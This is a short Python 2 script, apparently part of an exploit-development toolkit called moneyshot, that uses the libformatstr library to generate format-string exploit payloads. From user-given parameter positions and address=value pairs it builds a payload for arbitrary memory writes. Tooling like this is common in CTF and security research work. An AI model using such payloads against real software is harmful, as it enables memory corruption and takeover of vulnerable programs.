#!/usr/bin/python

import sys
from lib.libformatstr import FormatStr

def main(args):
	if len(args) < 1:
		print "usage: moneyshot fmt <primitives>\n"
		print "availables primitives:"
		print "  * p:NNNN      - parameter position where user-controlled input starts"
		print "  * n:NNNN      - specify bytes already written (defaults to 0)"
		print "  * w:XXXX=YYYY - write value YYYY to address XXXX\n"

		return

	p = FormatStr()

	param_pos = 0
	already_written = 0

	for param in args:
		if param[0:2] == "w:":
			(addr,val) = param[2:].split("=")
			p[ int(addr, 0) ] = int(val, 0);
		elif param[0:2] == "p:":
			param_pos = int(param[2:], 0)
		elif param[0:2] == "n:":
			already_written = int(param[2:], 0)
		else:
			print "UNKNOWN FMT specifier: '%s'" % (param)
			exit()

	sys.stdout.write( p.payload(param_pos, start_len=already_written) )
